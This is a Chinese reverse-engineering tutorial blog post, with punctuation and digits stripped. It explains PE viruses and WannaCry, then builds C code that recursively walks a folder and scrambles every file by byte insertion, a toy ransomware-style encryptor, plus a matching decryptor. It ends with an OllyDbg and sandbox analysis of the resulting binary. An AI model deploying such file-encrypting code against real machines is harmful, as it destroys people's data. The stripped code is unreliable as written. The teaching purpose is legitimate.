系统安全 七 逆向 分析 之 pe 病毒 原理 c++ 实现 文件 加解密 及 ollydbg 逆向 您 可能 之前 看到过 我 写 的 类似 文章 为什么 还要 重复 撰写 呢 只是 想 更好 地 帮助 初学者 了解 病毒 逆向 分析 和 系统安全 更加 成 体系 且不 破坏 之前 的 系列 因此 我 重新 开 设了 这个 专栏 准备 系统 整理 和 深入 学习 系统安全 逆向 分析 和 恶意代码 检测 系统安全 系列 文章 会 更加 聚焦 更加 系统 更加 深入 也是 作者 的 慢慢 成长史 换 专业 确实 挺 难 的 逆向 分析 也是 块 硬骨头 但我 也 试试 看看 自己 未来 四年 究竟 能 将它 学到 什么 程度 漫漫 长征路 偏向虎山行 享受 过程 一起 加油 系统安全 系列 作者 将 深入研究 恶意 样本 分析 逆向 分析 攻防 实 战和 windows 漏洞 利用 等 通过 在线 笔记 和 实践 操作 的 形式 分享 与 博 友 们 学习 希望 能与 您 一起 进步 前文 介绍 了 条件 语句 和 循环 语句 源码 还原 及 流程 控制 逆向 这篇 文章 将 分享 勒索 病毒 通过 编写程序 实现 获取 windows 系统 目录 文件 并 对 其 进行 加密 和 解密 的 过程 第二 部分 详细 讲 解了 ollydbg 和 在线 沙箱 的 逆向 分析 过程 希望 对 入门 的 同学 有 帮助 话 不 多说 让我们 开始 新 的 征程 吧 您 的 点 赞 评论 收藏 将是 对 我 最大 的 支持 感恩 安全 路上 一路 前行 如果有 写得 不好 的 地方 可以 联系 我 修改 基础性 文章 希望 对 您 有所 帮助 作者 的 目的 是 与 安 全人 共同进步 加油 也 强烈推荐 大家 去 看看 参考文献 的 视频 和 书籍 文章 目录 一 pe 病毒 和 wannacry 勒索 蠕虫 pe 病毒 pe 病毒 的 分类 勒索 病毒 二 获取 系统 文件 及 加密 处理 三 ollydbg 和 在线 沙箱 逆向 分析 ollydbg 分析 在线 沙箱 分析 四 总结 作者 的 github 资源 系统安全 网络安全 前文 分析 系统安全 一 什么 是 逆向 分析 逆向 分析 基础 及 经典 扫雷 游戏 逆向 系统安全 二 如何 学好 逆向 分析 及 吕布 传 游戏 逆向 案例 系统安全 三 idapro 反汇编 工具 初识 及 逆向 工程 解密 实战 系统安全 四 ollydbg 动态 分析 工具 基础 用法 及 crakeme 逆向 破解 系统安全 五 ollydbg 和 cheatengine 工具 逆向 分析 植物 大战 僵尸 游戏 系统安全 六 逆向 分析 之 条件 语句 和 循环 语句 源码 还原 及 流程 控制 系统安全 七 逆向 分析 之 pe 病毒 原理 c 实现 文件 加解密 及 ollydbg 逆向 声明 本人 坚决 反对 利用 教学方法 进行 犯罪 的 行为 一切 犯罪行为 必将 受到 严惩 绿色 网络 需要 我们 共同 维护 更 推荐 大家 了解 它们 背后 的 原理 更好 地 进行 防护 一 pe 病毒 和 wannacry 勒索 蠕虫 pe 病毒 什么 是 pe 病毒 pe 病毒 是以 windowspe 程序 为 载 体能 寄 生于 pe 文件 或 windows 系统 的 病毒 程序 pe 病毒 数量 非常 之多 包括 早起 的 cih 病毒 全球 第一个 可以 破坏 计算机硬件 的 病毒 它会 破坏 主办 的 bios 对 其 数据 进行 擦写 修改 再 比如 熊猫 烧香 机器 狗 等等 其 危害 非常 之大 什么 叫 感染 说到 病毒 不得 不提 感染 感染 是 指在 尽量 不影响 目标 程序 系统 正常 功能 的 前提下 而 使其 具有 病毒 自身 的 功能 什么 叫 病毒 自身 的 功能 呢 一个 病毒 通常 包括 如下 模块 感染 模块 被 感人 程序 同样 具备 感染 能力 触发 模块 在 特定 条件下 实施 相应 的 病毒 功能 比如 日期 键盘输入 等 破坏 模块 其他 模块 cih 病毒 cih 病毒 是 一种 能够 破坏 计算机 系统 硬件 的 恶性 病毒 这个 病毒 产自 tw 原 集 嘉 通讯 公司 工程师 陈 盈 豪 在其 于 tw 大同 工学院 念书 期间 制作 最早 随 国际 两大 盗版 集团 贩卖 的 盗版 光 盘在 欧美 等地 广泛传播 随后 进一步 通过 网络 传 播到 全世界 各个 角落 cih 的 载体 是 一个 名为 icq 中文 chat 模块 的 工具 并以 热门 盗版 光盘 游戏 如 古墓 奇兵 或 windows 为 媒介 经 互联网 各 网站 互相 转载 使其 迅速 传播 目前 传播 的 主要 途径 主要 通过 internet 和 电子邮件 当然 随着 时间 的 推移 其 传播 主要 仍将 通过 软盘 或 光盘 途径 cih 病毒 曾 入 榜 全球 十大 计算机病毒 之首 该 病毒 引 起了 许多 重要 部门 的 严密 关注 其 原因 不言而喻 如果 指挥 通信 政务 等 系统 受到了 cih 病毒 的 威胁 甚至 破坏 其 后果不堪设想 如果 我们 要 编写 pe 病毒 则 需要 掌握 以下 的 关键 病毒 的 重 定位 获取 api 函数 地址 文件 搜索 内存 映射 文件 病毒 如何 感染 其他 文件 病毒 如何 返 回到 host 程序 pe 病毒 的 分类 以 感染 目标 进行 分类 包括 文件 感染 将 代码 寄 生在 pe 文件 病毒 本身 只是 pe 文件 的 一部分 依赖于 感染 目标 通常 也 叫 host 文件 控制权 获得 也 是以 目标 程序 运行 来 获得 的 分为 传统 感染 型 以 win 汇编程序 编写 为主 捆绑 释放 型 编写 难度 较低 通过 高级 语言 均可 编写 将 目标 程序 和 病毒 程序 捆在 一起 和 捆绑 器 有 相似之处 系统 感染 将 代码 或 程序 寄 生在 windows 操作系统 该类 病毒 越来越多 它不 感染 具体 文件 但是 它 会在 操作系统 中 保存 自己 的 实体 同时 也 可以 通过 系统启动 的 方法来 获取 控制权 传播 途径 包括 即时 通信 软件 如 qq 尾巴 u盘 光盘 电子邮件 网络共享 其他 途径 推荐 作者 前文 windowspe 病毒 原理 分类 及 感染 方式 详解 勒索 病毒 勒索 病毒 主要功能 是 遍历 电脑 上 所有 文件 并且 用 加密算法 加密 然后 把 加密 密钥 发送到 自己 的 邮箱 里 弹出 对应 的 窗口 勒索 从而 解密 典型 的 是 wannacry 病毒 作者 在 网络安全 自学 篇 中 详细 介绍 过 它 的 分析 过程 也 推荐 大家 去 学习 wannacry 勒索 病毒 复现 及 分析 四 蠕虫 传播 机制 全网 源码 详细 解读 年月日 wannacry 蠕虫 通过 永恒 之 蓝 ms 漏洞 在 全球 范围 大 爆发 感染 大量 的 计算机 wannacry 勒索 病毒 全球 大 爆发 至少 个 国家 万名 用户 中招 造成 损失 达 亿 美元 已 影响 金融 能源 医疗 教育 等 众多 行业 造成 严重 的 危害 wannacry 是 一种 蠕虫 式 勒索 病毒软件 由 不法分子 利用 nsa 泄露 方程式 工具包 的 危险 漏洞 eternalblue 永恒 之 蓝 进行 传播 该 蠕虫 感染 计算机 后会 向 计算机中 植入 敲诈者 病毒 导致 电脑 大量 文件 被 加密 wannacry 利用 windows 系统 的 smb 漏洞 获取 系统 的 最高 权限 该 工具 通过 恶意代码 扫描 开放 端口 的 windows 系统 被 扫 描到 的 windows 系统 只要 开机 上线 不需要 用户 进行 任何 操作 即可 通过 共享 漏洞 上传 wannacry 勒索 病毒 等 恶意程序 wannacry 利用 永恒 之 蓝 漏洞 进行 网络 端口扫描 攻击 目标 机器 被 成功 攻陷 后会 从 攻击机 下载 wannacry 木马 进行 感染 并 作为 攻击机 再次 扫描 互联网 和 局域网 的 其他 机器 行 成 蠕虫 感染 大范围 超 快速 扩散 木马 母体 为 mssecsvcexe 运行 后会 扫描 随机 ip 的 互联网 机器 尝试 感染 也 会 扫描 局域网 相同 网段 的 机器 进行 感染 传播 此外 会 释放 敲诈者 程序 taskscheexe 对 磁盘 文件 进行 加密 勒索 木马 加密 使用 aes 加密 文件 并 使用 非对称 加密算法 rsa 加密 随机 密钥 每个 文件 使用 一个 随机 密钥 理论上 不可 pj 同时 显示 勒索 界面 其 核心 流程 如 下图 所示 wannacry 勒索 病毒 主要 行为 是 传播 和 勒索 传播 利用 基于 端口 的 smb 漏洞 ms 永恒 之 蓝 进行 传播 勒索 释放 文件 包括 加密器 解密器 说明 文件 语言 文件 等 内存 加载 加密器 模块 加密 执行 类型 文件 全部 加密 后 启动 解密器 解密器 启动 后 设置 桌面背景 显示 勒索 信息 弹出 窗口 显示 付款 账号 和 勒索 信息 二 获取 系统 文件 及 加密 处理 前面 第一 部分 简单 普及 了 病毒 和 勒索 的 基本概念 它们 都与 感染 加密 解密 传播 勒索 等 关键词 密切相关 接下来 我 将 带着 大家 实现 最 简单 的 系统 文件 加密 及 解密 功能 只有 掌握 了 这些 基本知识 才能 更好 地 服务于 我们 的 逆向 分析 工程 注意 这里 仅 允许 大家 加密 自己 电脑 的 文件夹 并且在 虚拟机 中 进行 实验 不 要去 恶意 损坏 他人 的 计算机 设备 一切 破坏 和 攻击行为 后果自负 假设 桌面 存在 如 下图 所示 的 文件 文件夹 加密 我们 需要 获 取其 信息 再进 行 文件 遍历 及 加密 操作 操作系统 api 加密算法 解密 算法 ps 建议 大家 创建 一个 新 的 文件夹 并 复制 一些 无效 文件 进去 测试 第一步 创建 windows 控制台 程序 第二步 在 编写 一个 简单 的 加密 函数 前 首先 需要 创建 文件 并 执行 打开 读写 操作 文件 加密 函数 voidjiami charfilename 打开 文件 filefpnull 文件 指针 变量 fpfopen filenamer 打开 可 读写 的 文件 if nullfp printf 打开 文件 失败 n returnprintf 打开 s 文件 成功 nfilename 获取 文件 大小 每隔 一个 字节 插入 一个字 节 数据 保存 关闭 intmain jiami 文件夹 加密 testtxt return 运行 结果 如 下图 所示 注意 如果 提示 传递 参数 不 兼容 需要 进行 如下 设置 高级 字符 级 处 设置 编码 方式 为 使用 多 直接 字符集 c 语言 处 设置 符合 模式 为 否 同时 如果 提示 错误 则 因为 vs 认为 fopen 函数 是 不安全 的 需要 如下 设置 取消 安全 开发 生命周期 sdl 检查 设置 第三步 计算 文件 大小 该 文件 共 个 字节 基本 流程 为 设置 光标 文件 内容 指针 到 文件 末尾 计算 光标 位置 距离 文 件头 字节数 设置 光标 位置 到 文 件头 文件 加密 函数 voidjiami charfilename filefpnull 文件 指针 变量 intsize 文件 大小 打开 文件 fpfopen filenamer 打开 可 读写 的 文件 if nullfp printf 打开 文件 失败 n returnprintf 打开 s 文件 成功 nfilename 获取 文件 大小 fseek fpseekend 设置 光标 到 文件 末尾 sizeftell fp 计算 光标 位置 距离 文 件头 字节数 fseek fpseekset 设置 光标 位置 到 文 件头 printf 文件 大小 为 d 字节 nsize 每隔 一个 字节 插入 一个字 节 数据 保存 关闭 intmain jiami 文件夹 加密 testtxt return 输出 结果 如 下图 所示 第四步 循环 插入 字节 实现 简单 的 加密 如果 我们 在 进行 文件 操作 时 遇到 权限 不够 的 情况 需要 进行 相关 提 权 操作 再 进行 加密 处理 核心 函数 如下 jiami 自定义 函数 读取 文件 每个 一个 字符 添加 一个 a 实现 文件 简单 加密 操作 文件 加密 函数 参数 文件 名字 voidjiami charfilename filefpnull 文件 指针 变量 intsize 文件 大小 打开 文件 fpfopen filenamer 打开 可 读写 的 文件 if nullfp printf 打开 文件 失败 n returnprintf 打开 s 文件 成功 nfilename 获取 文件 大小 fseek fpseekend 设置 光标 到 文件 末尾 sizeftell fp 计算 光标 位置 距离 文 件头 字节数 fseek fpseekset 设置 光标 位置 到 文 件头 printf 文件 大小 为 d 字节 nsize 获取 文件 所有 内容 char malloc size sizeof char readsizefread tmpsizeof char sizefp tmpsizeprintf 读取 字符串 为 tmp 每隔 一个 字节 插入 一个字 节 数据 dddtxtw 写入 文件 ptxt char malloc sizeof char strlen tmp for intisizeigti chtmpiif i dccnichptxti ptxtsizeprintf 操作 后 字符串 sdnptxtstrlen ptxt fwrite ptxtsizeof char sizefpw 保存 关闭 fclose fp fclose fpw return 运行 程序 后 我们 打开 testtxt 查看 如下 发现 一个 简单 的 加密 或 扰乱 完成 变 成了 一堆 乱码 当 加密 函数 写好 之后 我们 接着 需要 编写 一个 遍历 文件夹 的 函数 实现 对 整个 目录 进行 加密 处理 再次 强调 大家 只能 加密 自己 电脑 的 文件夹 并且在 虚拟机 中 进行 实验 不 要去 恶意 损坏 他人 的 计算机 设备 第五步 编写 遍历 文件夹 函数 通常 遍历 文件夹 采用 的 是 递归 方法 依次 遍历 某个 目录 的 文件夹 深度 搜索 文件夹 中 的 内容 如果是 文件 就 加密 如果是 文件夹 就 继续 深度 搜索 直至 找到 文件 依次 返回 从而 实现 整个 目录 的 文件 遍历 遍历 文件夹 找到 每个 文件 参数 文件夹 名字 voidfindfile charpathname 禁止 加密 他人 计算机 一定 只 能对 指定 目录 加密 尤其 不 能对 c 盘 加密 设置 要 找 的 文件名 通配符 实现 findfilename 清空 数组 sprintf printf 要 找 的 文件名 是 snfindfilename returnintmain jiami 文件夹 加密 testtxt 获取 当前 文件夹 buff printf 当前 目录 是 snnbuff return 上述 代码 通过 自定义 函数 遍历 文件夹 同时 调用 api 函数 获取 当前 目录 核心 函数 为 获取 当前 目录 findfile 自定义 函数 调用 通配符 获取 指定 目录 所有 文件 输出 结果 如 下图 所示 第六步 进一步 完善 遍历 文件夹 递归 调用 函数 调用 findfirstfile 函数 获取 目录 下第 一个 文件 如果 找到 第一个 文件 则 循环 调用 findnextfile 函数 获取 下一个 文件 如果 找到 的 是 文件夹 则 拼接 新 的 文件夹 路径 继续 递归 遍历 文件 遍历 文件夹 找到 每个 文件 参数 文件夹 名字 voidfindfile charpathname 禁止 加密 他人 计算机 一定 只 能对 指定 目录 加密 尤其 不 能对 c 盘 加密 设置 要 找 的 文件名 通配符 实现 findfilename 清空 数组 sprintf printf 要 找 的 文件名 是 snfindfilename 获取 目录 下第 一个 文件 定义 结构 体 判断 返回值 等于 if printf 查找文件 失败 n return 如果 成功 进入 死循环 继续 查找 下一个 文件 ret 如果 找到 的 是 个 文件夹 则需 要继续 查找 该 文件夹 内容 if 文件夹 拼接 原始 路径 新 文件夹 路径 memset temp sprintf printf 找到 一个 文件夹 sntemp sleep 暂停 秒钟 findfile temp else 如果是 文件 则 加密 文件 memset temp sprintf printf 找到 一个 文件 sntemp 查找 下一个 文件 retfindnextfile returnintmain 获取 当前 文件夹 buff printf 当前 目录 是 snnbuff findfile buff return 在 写 代码 过程中 我们 一 定要 学会 边写 边 调试 或者 称为 打桩 输出 而 不是 一写 到底 最 后来 慢慢 修改 此时 运行 程序 它 输出 遍历 当前 目录 的 文件夹 结果 如 下图 所示 为什么 会 一直在 递归 呢 注意 这里 的 代表 当前 文件夹 所以 需要 过滤掉 该 点 否则 陷入 无限 递归 最终 运行 结果 如 下图 所示 将 当前 文件夹 内 所有 内容 显示出来 比如 debug 文件夹 中 内容 和 我们 的 获取 结果是 一一对应 的 第七步 实现 文件 加密 功能 作者 将 文件夹 改为 指定 的 目录 再次 强调 虚拟机 中 运行 或者 指定 某个 不重要 的 文件夹 进行 测试 具体 修改 是 在 findfile 函数 中 增加了 jiami 函数 的 调用 注意 使用 二进制 打开 可以 复制 大型 文件 如 exe 文件 音频 视频文件 等 所以 文件 操作 改为 rb 和 wb 由于 某些 文件 会 很大 我们 文件 读写 换了 一种 操作 按 字符 读入 及 写入 每一种 写法 和 优化 都是 有 原因 的 这个 过程 需要 你 去 慢慢 琢磨 包括 逆向 分析 也 一样 操作系统 或 编译器 恶意代码 为什么 这么 优化 我们 都 需要 慢慢 去 分析 完整 代码 如下 文件 加密 函数 参数 文件 名字 voidjiami filefpnull 文件 指针 变量 intsize 文件 大小 打开 文件 注意 使用 二进制 打开 可以 复制 大型 文件 如 exe 文件 音频 视频文件 等 fpfopen filenamerb 打开 可 读写 的 文件 if nullfp printf 打开 文件 失败 n returnprintf 打开 s 文件 成功 nfilename 获取 文件 大小 fseek fpseekend 设置 光标 到 文件 末尾 sizeftell fp 计算 光标 位置 距离 文 件头 字节数 fseek fpseekset 设置 光标 位置 到 文 件头 printf 文件 大小 为 d 字节 nsize 获取 文件 所有 内容 temp sprintf printf sntemp filefpwfopen tempwb 写入 文件 while feof fp chfgetc fp fputc chfpw fputc codefpw printf cnch 保存 关闭 fclose fp fclose fpw 替换 文件 commend sprintf 访问 路径 包含 空格 增加 双引号 printf sncommend system commend rename tempfilename 调用 c 语言 rename 函数 重命名 文件 printf n return 遍历 文件夹 找到 每个 文件 参数 文件夹 名字 voidfindfile charpathname 禁止 加密 他人 计算机 一定 只 能对 指定 目录 加密 尤其 不 能对 c 盘 加密 设置 要 找 的 文件名 通配符 实现 findfilename 清空 数组 sprintf printf 要 找 的 文件名 是 snfindfilename 获取 目录 下第 一个 文件 定义 结构 体 判断 返回值 等于 if printf 查找文件 失败 n return 如果 成功 进入 死循环 继续 查找 下一个 文件 ret 如果 找到 的 是 个 文件夹 则需 要继续 查找 该 文件夹 内容 if if 文件夹 拼接 原始 路径 新 文件夹 路径 memset temp sprintf printf 找到 一个 文件夹 sntemp sleep 暂停 秒钟 findfile temp else 如果是 文件 则 加密 文件 memset temp sprintf printf 找到 一个 文件 sntemp 加密 文件 jiami temppathname 查找 下一个 文件 retfindnextfile returnintmain buff printf 当前 目录 是 snnbuff 加密 指定 文件夹 目录 建议 使用 虚拟机 执行 findfile 文件夹 加密 return 最终 实现 效果 如 下图 所示 指定 目录 的 所有 文件 已经 被 加密 图片 已经 不能 显示 exe 程序 也 不能 执行 图片 打开 提示 图片 错误 无法 打开 exe 程序 也无 法 执行 接着 我们 用 editor 软件 打开 加密 文件 具体 的 内容 显示 如 下图 所示 注意 某次 执行 代码 没 修改 加密 文件夹 将 vs 当前 目录 全部 加密 工程 直接 奔 溃 最终 重新 创建 工程 所以 大家 仅能 试试 指定 目录 来 学习 加密 和 解密 原理 知识 第八 步 编写 解密 功能 当 我们 中了 勒索 病毒 就需要 解密 这里 我们 简单 给 大家 编写 一个 解密 函数 当然 真实 环境 中 mdhashsha 都是 比较 常用 的 加密算法 解密 文件 写有 两种 方法 全部 读入 内存 修改后 重新 存入 文件 边 读 边 写到 另一 新建 文件 要 修改 的 部分 修改后 存入 新建 文件 其他 部分 原封不动 写入 写完 删掉 原先 文件 并将 这个 新 的 改为 删掉 那个 的 名字 这里 由于 作者 知道 加密 规则 则 进行 单个 字符 奇偶 判断 写入 的 处理 代码 如下 文件 加密 函数 参数 文件 名字 voidjiami filefpnull 文件 指针 变量 intsize 文件 大小 打开 文件 注意 使用 二进制 打开 可以 复制 大型 文件 如 exe 文件 音频 视频文件 等 fpfopen filenamerb 打开 可 读写 的 文件 if nullfp printf 打开 文件 失败 n returnprintf 打开 s 文件 成功 nfilename 获取 文件 大小 fseek fpseekend 设置 光标 到 文件 末尾 sizeftell fp 计算 光标 位置 距离 文 件头 字节数 fseek fpseekset 设置 光标 位置 到 文 件头 printf 文件 大小 为 d 字节 nsize 获取 文件 所有 内容 temp sprintf printf sntemp filefpwfopen tempwb 写入 文件 while feof fp chfgetc fp fputc chfpw fputc codefpw printf cnch 保存 关闭 fclose fp fclose fpw 替换 文件 commend sprintf 访问 路径 包含 空格 增加 双引号 printf sncommend system commend rename tempfilename 调用 c 语言 rename 函数 重命名 文件 printf n return 文件 解密 函数 参数 文件 名字 voidjiemi charchintsize 文件 大小 filefp 打开 文件 filefpw 写入 文件 chartmp 初始化 操作 memset tmp sprintf tmpstmppathname printf sntmp fpfopen filenamerb fpwfopen tmpwb fseek fpwseekset 设置 光标 位置 到 文 件头 每隔 一个 字节 删除 一个字 节 数据 intiwhile feof fp chfgetc fp if i 偶数 写入 ifputc chfpw fp fclose fpw 替换 文件 commend sprintf 访问 路径 包含 空格 增加 双引号 printf sncommend system commend rename tmpfilename 调用 c 语言 rename 函数 重命名 文件 printf n return 遍历 文件夹 找到 每个 文件 参数 文件夹 名字 voidfindfile charpathname 禁止 加密 他人 计算机 一定 只 能对 指定 目录 加密 尤其 不 能对 c 盘 加密 设置 要 找 的 文件名 通配符 实现 findfilename 清空 数组 sprintf printf 要 找 的 文件名 是 snfindfilename 获取 目录 下第 一个 文件 定义 结构 体 判断 返回值 等于 if printf 查找文件 失败 n return 如果 成功 进入 死循环 继续 查找 下一个 文件 ret 如果 找到 的 是 个 文件夹 则需 要继续 查找 该 文件夹 内容 if if 文件夹 拼接 原始 路径 新 文件夹 路径 memset temp sprintf printf 找到 一个 文件夹 sntemp sleep 暂停 秒钟 findfile temp else 如果是 文件 则 加密 文件 memset temp sprintf printf 找到 一个 文件 sntemp 加密 文件 jiami temppathname 解密 文件 jiemi temppathname 查找 下一个 文件 retfindnextfile returnintmain buff printf 当前 目录 是 snnbuff 加密 指定 文件夹 目录 建议 使用 虚拟机 执行 findfile 文件夹 加密 return 最终 成功 还原 代码 图片 和 exe 程序 又能 运 行了 但是 遗憾 的 是 在 文本 中 涉及 中文 字符 仍然 出现 了 部分 乱码 哈哈 大家 告诉我 怎么 处理 呢 感觉 需要 中文 字符 两 字节 判断 操作 但也 不影响 这篇 文章 分享 的 加密 与 解密 基础知识 甚至 你 还 可以 做一个 界面 包含 加密 按钮 和 解密 按钮 融合 hashmd 各种 算法 进行 相关 操作 这里 仅 采用 命令行 的 形式 告诉 大家 原理 希望 对 您 有所 帮助 对 比下 加密 文件 三 ollydbg 和 在线 沙箱 逆向 分析 ollydbg 分析 接着 我们 通过 od 打开 加密 的 exe 程序 对 其 进行 简单 的 逆向 分析 显示 如 下图 所示 可以 看到 有 很多 cc 指令 这是 vs 的 一些 措施 接着 我们 尝试 简单 分析 模块 入口 点 xec 第一步 右键 选择 查找 gt 当前 模块 中 的 名称 我们 尝试 查看 该 exe 执行 的 函数 我们 可以 看到 调用 的 winapi 函数 如 下图 所示 调用 findfirstfilea 和 findnextnexta 函数 应该是 在 遍历 文件 目录 同时 包括 了 文件 操作 函数 等 同时 包括 了 一些 线程 和 进程 相关 的 函数 第二步 选中 该 函数 右键 点击 在 每个 参 考上 设置 断点 接着 进入 对应 断点 位置 进行 调试 设置 断点 函数 一般 为 文件 操作 api 操作 数据 显示 等第 三步 另一 种方法 是 选择 所有 模块 间 的 调用 查看 调用 的 函数 信息 显示 结果 如 下图 所示 包括 我们 使用 的 函数 属于 kernel 中 也有 sleep 睡眠 函数 以及 文件 操作 fopenfseekfgetc 等第 四步 我们 选中 某个 函数 右键 即可 设置 断点 比如 findnextfilea 和 findfirstfilea 函数 接着 按 下 b 键 可以 看到 已经 设置 的 断点 信息 第五步 接着 选中 断点 选择 反汇编 窗口 中 跟随 可以 看到 对应 断点 findnextfilea 位置 这是 逆向 分析 对 指定 模块 进行 分析 的 常用 方法 接着 按 下 f 调试程序 然后 停在 断点 位置 再按 下 f 进入 断点 单步 调试 恶意 样本 的 核心 模块 比如 该 函数 获取 的 参数 即为 文件夹 加密 这就 看到了 打开 该 文件夹 的 目录 接续 调试 我们 可以 看到 参数 传递 字符串 拼接 睡眠 函数 等 内容 重点是 我们 要 通过 call 分析 进入到 加密 函数 中 然 后去 分析 加密 的 算法 从而 实现 逆向 pj 程序 运行 结果 如 下图 所示 我们 可以 结合 输出 的 结果 进行 每个 功能模块 的 分析 及 逆向 最终 一个 简单 的 逆向 分析 过程 讲解 完毕 最 重要 的 是 我们 通过 自己 编写 加密 解密 算法 然而 再 对 其 进行 分析 从而 加深 我们 初学者 学习 逆向 的 经验 这里 提出 几个问题 供 大家 和我 思考 od 逆向 怎么 判断 恶意 样本 pe 文件 执行 或 检测 了 哪些 文件 od 逆向 怎么 判断 恶意 样本 pe 文件 是否 具有 注册表 操作系统 进程 获取 屏幕 截 屏 等 操作 od 逆向 怎么 判断 恶意 样本 pe 文件 的 网络 操作 ip 地址 邮箱 域名 访问 请求 情况 od 逆向 怎么 判断 恶意 样本 pe 文件 是否 具有 蠕虫 传播 感染 功能 怎么 溯源 一个 恶意 样本 在线 沙箱 分析 在 恶意 样本 逆向 分析 中 在线 平台 给 我们 提供 了 强大 支撑 我们 拿到 一个 样本 之后 可以 先 对 其 进行 在线 监测 其 操作 比较简单 就是 将 恶意 样本 上传 至 指定 在想 网址 即可 常见 的 在线 沙箱 分析 包括 virustotal 沙箱 沙箱 沙箱 微 步 沙箱 我们 以 virustotal 沙箱 为 例 打开 主页 如 稀土 所示 点击 choosefile 上传 我们 的 勒索 exe 文件 结果 从 个 在线 引擎 中 扫描 出个 是 恶意 样本 的 引擎 如 下图 所示 我们 可以 看到 该 样本 的 基本信息 包括 mdsha 等 接着 着 是 文件 历史 信息 以及 pe 文件 节点 信息 下面 有 一个 重点是 该 文件 的 导入 函数 信息 在 imports 中 显示 主要 包括 主要 包括 的 文件 操作 如 下图 所示 比如 等 函数 如果 该 样本 有 恶意 家族 关联 它也 能 给出 相应 的 信息 四 总结 写到 这里 这篇 文章 就 介绍 完毕 希望 对 您 有所 帮助 最后 进行 简单 的 总 结下 pe 病毒 和 wannacry 勒索 蠕虫 pe 病毒 pe 病毒 的 分类 勒索 病毒 获取 系统 文件 及 加密 处理 ollydbg 逆向 分析 学 安全 一年 认识了 很多 安全 大佬 和 朋友 希望 大家 一起 进步 这篇 文章 中 如果 存在 一些 不足 还请 海涵 作者 作为 网络安全 初学者 的 慢慢 成长 路 吧 希望 未来 能 更 透彻 撰写 相关 文章 同时 非常感谢 参考文献 中 的 安全 大佬 们 的 文章 分享 深知 自己 很菜 得 努力 前行 作者 的 github 资源 系统安全 网络安全 很多 朋友 问我 如何 学 逆向 分析 下面 给出 推荐 的 学习 路线 和 安全 书籍 软件 逆行 其实 就是 搬 砖 活 你 需要 的 是 任性 和 基本功 可能 大佬 们 会有 很多 技巧 但我 希望 你 能 扎扎实实 去 躺过 那些 坑 会 看懂 代码 会写 代码 然后 ida 和 od 工具 倚天 屠龙 用好 每天 泡在 代码 中肯 定 能行 的 你 应该 这样 学习 多 敲 代码 重视 实战 程序 不是 写出来 的 是 调出来 的 根据 自己 兴趣 和 市场需求 做 一定 规模 的 项目 最后 给 出了 这一 年 我 在 网络安全 系统安全 和 机器 学习 看过 的 书 如果 你 想把 ai 更好 的 融入 安全 领域 看看 这些 书籍 还是 挺不错 我 也 厚着脸皮 把 自己 写 的 两本 python 数据 分析 书 放了 进来 哈哈 网络安全 系统安全 ai 安全 编程 没有 捷径 逆向 也没有 捷径 它们 都是 搬 砖 活 少 琢磨 技 巧干 就 对了 什么时候 你 把 攻击 对手 按在 地上 摩擦 你 就 赢了 也 会 慢慢 形 成了 自己 的 安全 经验 和 技巧 加油 吧 少年 希望 这个 路线 对 你 有所 帮助 共勉 年月 新开 的 娜 璋 ai 安全 之家 主要 围绕 python 大数 据分析 网络空间 安全 人工智能 web 渗透 及 攻防 技术 进行 讲解 同时 分享 ccfsci 南 核 北 核 论文 的 算法 实现 娜 璋 之家 会 更加 系统 并 重构 作者 的 所有 文章 从 零 讲解 python 和 安全 写了 近十年 文章 真心 想把 自己 所学 所 感 所做 分享 出来 还请 各位 多多指教 真诚 邀 请您 的 关注 谢谢 byeastmount 周五 夜 于 武汉 参考资料 真心 推荐 大家好 好看 看 这些 视频 和 文章 感恩 这些 大佬 